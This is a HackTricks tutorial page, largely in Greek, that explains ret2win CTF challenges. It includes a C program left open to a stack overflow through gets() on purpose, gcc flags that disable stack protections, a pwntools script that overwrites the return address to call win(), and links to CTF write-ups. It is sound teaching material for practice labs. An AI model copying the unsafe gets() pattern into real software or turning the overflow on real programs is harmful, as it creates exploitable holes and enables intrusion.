# Ret2win

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Οι προκλήσεις **Ret2win** είναι μια δημοφιλής κατηγορία σε διαγωνισμούς **Capture The Flag (CTF)**, ιδιαίτερα σε εργασίες που περιλαμβάνουν **binary exploitation**. Ο στόχος είναι να εκμεταλλευτούμε μια ευπάθεια σε μια δεδομένη δυαδική μορφή για να εκτελέσουμε μια συγκεκριμένη, μη κληθείσα συνάρτηση μέσα στη δυαδική μορφή, συχνά ονομαζόμενη κάτι όπως `win`, `flag`, κ.λπ. Αυτή η συνάρτηση, όταν εκτελείται, συνήθως εκτυπώνει μια σημαία ή ένα μήνυμα επιτυχίας. Η πρόκληση περιλαμβάνει συνήθως την επαναγραφή της **διεύθυνσης επιστροφής** στη στοίβα για να κατευθύνει τη ροή εκτέλεσης στη επιθυμητή συνάρτηση. Ακολουθεί μια πιο λεπτομερής εξήγηση με παραδείγματα:

### C Example

Consider a simple C program with a vulnerability and a `win` function that we intend to call:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Για να μεταγλωττίσετε αυτό το πρόγραμμα χωρίς προστασίες στο stack και με το **ASLR** απενεργοποιημένο, μπορείτε να χρησιμοποιήσετε την παρακάτω εντολή:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-m32`: Συγκεντρώστε το πρόγραμμα ως 32-bit δυαδικό (αυτό είναι προαιρετικό αλλά κοινό σε προκλήσεις CTF).
- `-fno-stack-protector`: Απενεργοποιήστε τις προστασίες κατά των υπερχειλίσεων στο στοίβας.
- `-z execstack`: Επιτρέψτε την εκτέλεση κώδικα στη στοίβα.
- `-no-pie`: Απενεργοποιήστε το Position Independent Executable για να διασφαλίσετε ότι η διεύθυνση της συνάρτησης `win` δεν αλλάζει.
- `-o vulnerable`: Ονομάστε το αρχείο εξόδου `vulnerable`.

### Python Exploit using Pwntools

Για την εκμετάλλευση, θα χρησιμοποιήσουμε **pwntools**, ένα ισχυρό πλαίσιο CTF για τη συγγραφή εκμεταλλεύσεων. Το σενάριο εκμετάλλευσης θα δημιουργήσει ένα payload για να υπερχειλίσει το buffer και να αντικαταστήσει τη διεύθυνση επιστροφής με τη διεύθυνση της συνάρτησης `win`.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Για να βρείτε τη διεύθυνση της συνάρτησης `win`, μπορείτε να χρησιμοποιήσετε **gdb**, **objdump** ή οποιοδήποτε άλλο εργαλείο που σας επιτρέπει να επιθεωρείτε δυαδικά αρχεία. Για παράδειγμα, με το `objdump`, θα μπορούσατε να χρησιμοποιήσετε:
```sh
objdump -d vulnerable | grep win
```
Αυτή η εντολή θα σας δείξει τη συναρμολόγηση της `win` συνάρτησης, συμπεριλαμβανομένης της διεύθυνσης εκκίνησής της.&#x20;

Το σενάριο Python στέλνει ένα προσεκτικά κατασκευασμένο μήνυμα που, όταν επεξεργαστεί από τη `vulnerable_function`, υπερχειλίζει το buffer και αντικαθιστά τη διεύθυνση επιστροφής στο stack με τη διεύθυνση της `win`. Όταν η `vulnerable_function` επιστρέφει, αντί να επιστρέψει στη `main` ή να τερματίσει, πηδά στη `win`, και το μήνυμα εκτυπώνεται.

## Προστασίες

- [**PIE**](../../common-binary-protections-and-bypasses/pie/index.html) **θα πρέπει να είναι απενεργοποιημένο** για να είναι η διεύθυνση αξιόπιστη σε όλες τις εκτελέσεις ή η διεύθυνση όπου θα αποθηκευτεί η συνάρτηση δεν θα είναι πάντα η ίδια και θα χρειαστείτε κάποια διαρροή για να καταλάβετε πού είναι φορτωμένη η συνάρτηση win. Σε ορισμένες περιπτώσεις, όταν η συνάρτηση που προκαλεί την υπερχείλιση είναι `read` ή παρόμοια, μπορείτε να κάνετε μια **Μερική Υπεργραφή** 1 ή 2 byte για να αλλάξετε τη διεύθυνση επιστροφής ώστε να είναι η συνάρτηση win. Λόγω του πώς λειτουργεί το ASLR, τα τελευταία τρία hex nibbles δεν είναι τυχαία, οπότε υπάρχει μια **1/16 πιθανότητα** (1 nibble) να αποκτήσετε τη σωστή διεύθυνση επιστροφής.
- [**Stack Canaries**](../../common-binary-protections-and-bypasses/stack-canaries/index.html) θα πρέπει επίσης να είναι απενεργοποιημένα ή η συμβιβασμένη διεύθυνση επιστροφής EIP δεν θα ακολουθηθεί ποτέ.

## Άλλα παραδείγματα & Αναφορές

- [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
- [https://guyinatuxedo.github.io/04-bof_variable/tamu19_pwn1/index.html](https://guyinatuxedo.github.io/04-bof_variable/tamu19_pwn1/index.html)
- 32bit, χωρίς ASLR
- [https://guyinatuxedo.github.io/05-bof_callfunction/csaw16_warmup/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/csaw16_warmup/index.html)
- 64 bits με ASLR, με μια διαρροή της διεύθυνσης bin
- [https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html)
- 64 bits, χωρίς ASLR
- [https://guyinatuxedo.github.io/05-bof_callfunction/tu17_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof_callfunction/tu17_vulnchat/index.html)
- 32 bits, χωρίς ASLR, διπλή μικρή υπερχείλιση, πρώτα για να υπερχειλίσει το stack και να αυξήσει το μέγεθος της δεύτερης υπερχείλισης
- [https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt_strings/backdoor17_bbpwn/index.html)
- 32 bit, relro, χωρίς canary, nx, χωρίς pie, μορφή συμβολοσειράς για να αντικαταστήσει τη διεύθυνση `fflush` με τη συνάρτηση win (ret2win)
- [https://guyinatuxedo.github.io/15-partial_overwrite/tamu19_pwn2/index.html](https://guyinatuxedo.github.io/15-partial_overwrite/tamu19_pwn2/index.html)
- 32 bit, nx, τίποτα άλλο, μερική υπερχείλιση του EIP (1Byte) για να καλέσει τη συνάρτηση win
- [https://guyinatuxedo.github.io/15-partial_overwrite/tuctf17_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial_overwrite/tuctf17_vulnchat2/index.html)
- 32 bit, nx, τίποτα άλλο, μερική υπερχείλιση του EIP (1Byte) για να καλέσει τη συνάρτηση win
- [https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html)
- Το πρόγραμμα επικυρώνει μόνο το τελευταίο byte ενός αριθμού για να ελέγξει το μέγεθος της εισόδου, επομένως είναι δυνατό να προσθέσετε οποιοδήποτε μέγεθος όσο το τελευταίο byte είναι εντός του επιτρεπόμενου εύρους. Στη συνέχεια, η είσοδος δημιουργεί μια υπερχείλιση buffer που εκμεταλλεύεται με ένα ret2win.
- [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
- 64 bit, relro, χωρίς canary, nx, pie. Μερική υπερχείλιση για να καλέσει τη συνάρτηση win (ret2win)
- [https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/](https://8ksec.io/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain/)
- arm64, PIE, δίνει μια διαρροή PIE, η συνάρτηση win είναι στην πραγματικότητα 2 συναρτήσεις, οπότε ROP gadget που καλεί 2 συναρτήσεις
- [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/)
- ARM64, off-by-one για να καλέσει μια συνάρτηση win

## Παράδειγμα ARM64

{{#ref}}
ret2win-arm64.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
